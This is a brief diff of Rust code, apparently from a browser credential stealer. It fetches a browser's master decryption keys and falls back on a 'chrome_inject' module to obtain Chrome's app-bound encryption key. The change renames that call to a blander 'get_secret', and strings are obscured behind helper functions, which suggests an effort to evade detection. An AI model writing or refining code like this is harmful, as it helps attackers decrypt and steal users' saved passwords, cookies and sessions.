@@ -324,7 +324,7 @@ fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<MasterKe
     let has_app_bound = json[s_os_crypt()][s_app_bound_encrypted_key()].as_str().is_some();
     let app_bound = if has_app_bound {
         super::dpapi_fallback::try_from_local_state(&json).or_else(|| {
-            super::chrome_inject::fetch_app_bound_key(browser_name)
+            super::chrome_inject::get_secret(browser_name)
         })
     } else {
         None
